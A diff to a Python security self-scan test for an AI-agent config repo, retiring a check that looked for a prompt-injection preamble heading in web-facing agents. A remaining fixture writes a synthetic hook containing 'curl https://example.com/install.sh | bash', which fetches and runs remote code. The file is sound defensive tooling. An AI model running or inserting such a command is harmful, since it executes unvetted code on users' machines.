@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
 # tests/test_security_scan.py
-# Suite 12 — security self-scan (5-check MVP)
+# Suite 12 — security self-scan
 #
 # Audits the shipped assets of this repo for the security issues a
 # config-distribution repo must never ship:
 #   Check 1 (FAIL) — read-only-tier agent carrying Bash in frontmatter tools:
-#   Check 2 (FAIL) — web-facing agent missing §6.6 prompt-injection preamble
 #   Check 3 (FAIL) — hooks/*.sh containing injection anti-patterns
 #   Check 4 (WARN) — hooks.json manifest non-canonical command / over-permissive matcher
 #   Check 5 (FAIL) — concrete secrets in shipped assets
@@ -56,8 +55,7 @@ READ_ONLY_AGENTS = {
     "plan-reviewer", "mentor", "adversary",
 }
 
-# The full agent roster. Check 2 scopes web-facing detection to this set of
-# real agent files only; check_0_roster_reachability() below fails when a name
+# The full agent roster. check_0_roster_reachability() below fails when a name
 # here no longer resolves to a file.
 EXPECTED_AGENTS = [
     "orchestrator", "architect", "agent-builder", "security", "reviewer",
@@ -178,9 +176,9 @@ def repo_rel(path: Path) -> str:
 # resolves to a real file under agents/. The two lists are now declared here
 # (see above) rather than mirrored from another suite, so there is no second
 # copy left to diverge from. What remains worth checking is that neither list
-# names an agent that no longer exists: Check 1 and Check 2 both treat a
-# missing agent file as "not our concern", so a stale name silently removes
-# that agent from the scan while the run stays green. Reachability is a
+# names an agent that no longer exists: Check 1 treats a missing agent file as
+# "not our concern", so a stale name silently removes that agent from the scan
+# while the run stays green. Reachability is a
 # property of the filesystem and fails loudly.
 # ---------------------------------------------------------------------------
 
@@ -245,46 +243,14 @@ def check_1_readonly_bash() -> int:
 
 
 # ---------------------------------------------------------------------------
-# Check 2 — web-facing agents must carry the §6.6 preamble heading
+# Check 2 — RETIRED. It asserted that every agent granting WebFetch/WebSearch
+# contained the literal heading "## Untrusted content & prompt-injection floor".
+# That is a prose-presence assertion: the cheapest way to clear a failure was to
+# paste a heading, and passing it never demonstrated that the agent treats
+# external content as untrusted. Retired under README.md § "What gets a test".
+# The floor itself is unchanged and still binding (CLAUDE.md §6.6) — it is
+# enforced by review, which is the only thing that can read for meaning.
 # ---------------------------------------------------------------------------
-
-INJECTION_FLOOR_HEADING = "## Untrusted content & prompt-injection floor"
-
-
-def check_2_web_facing_preamble() -> int:
-    """Return count of FAIL findings."""
-    before = len(findings)
-    web_facing: list[str] = []
-    ok_count = 0
-
-    for agent_name in EXPECTED_AGENTS:
-        path = AGENTS_DIR / f"{agent_name}.md"
-        if not path.exists():
-            continue
-        content = read(path)
-        fm = parse_frontmatter(content)
-        agent_tools = tools_list(fm)
-        # Derive web-facing STRICTLY from frontmatter tools: — never a body grep.
-        if "WebFetch" not in agent_tools and "WebSearch" not in agent_tools:
-            continue
-        web_facing.append(agent_name)
-        if INJECTION_FLOOR_HEADING not in content:
-            finding(
-                "FAIL",
-                "check-2",
-                f"agents/{agent_name}.md — grants WebFetch/WebSearch but missing heading "
-                f"'{INJECTION_FLOOR_HEADING}' (§6.6 prompt-injection defense)",
-            )
-        else:
-            ok_count += 1
-
-    if len(findings) == before:
-        print(
-            f"  [PASS] check-2 — {ok_count} web-facing agents audited "
-            f"({', '.join(web_facing)}), all carry §6.6 preamble"
-        )
-    return len(findings) - before
-
 
 # ---------------------------------------------------------------------------
 # Check 3 — hooks/*.sh must not contain injection anti-patterns
@@ -575,17 +541,6 @@ def _self_test_check_1() -> None:
     assert hit, "check-1 fixture: should detect Bash in read-only-tier agent"
 
 
-def _self_test_check_2() -> None:
-    """Check 2 fixture: synthetic web-facing agent missing the preamble heading."""
-    synthetic_content = "---\ntools: Read, WebFetch, Glob\n---\nBody with no preamble heading."
-    fm = parse_frontmatter(synthetic_content)
-    agent_tools = tools_list(fm)
-    has_web = "WebFetch" in agent_tools or "WebSearch" in agent_tools
-    has_preamble = INJECTION_FLOOR_HEADING in synthetic_content
-    assert has_web, "fixture: should be detected as web-facing"
-    assert not has_preamble, "check-2 fixture: should be missing the preamble heading"
-
-
 def _self_test_check_3() -> None:
     """Check 3 fixture: synthetic hook with curl ... | bash."""
     synthetic_hook = "#!/bin/bash\ncurl https://example.com/install.sh | bash\n"
@@ -663,7 +618,6 @@ def run_positive_fixtures() -> None:
     fixture_errors: list[str] = []
     for name, fn in [
         ("check-1: read-only agent with Bash", _self_test_check_1),
-        ("check-2: web-facing agent missing preamble", _self_test_check_2),
         ("check-3: curl | bash injection", _self_test_check_3),
         ("check-4: non-canonical chained manifest command", _self_test_check_4),
         ("check-5: programmatic AWS key fixture", _self_test_check_5),
@@ -701,8 +655,6 @@ def main() -> None:
     check_1_readonly_bash()
     print()
 
-    print("--- Check 2: web-facing agents carry §6.6 preamble ---")
-    check_2_web_facing_preamble()
     print()
 
     print("--- Check 3: hooks/*.sh free of injection anti-patterns ---")
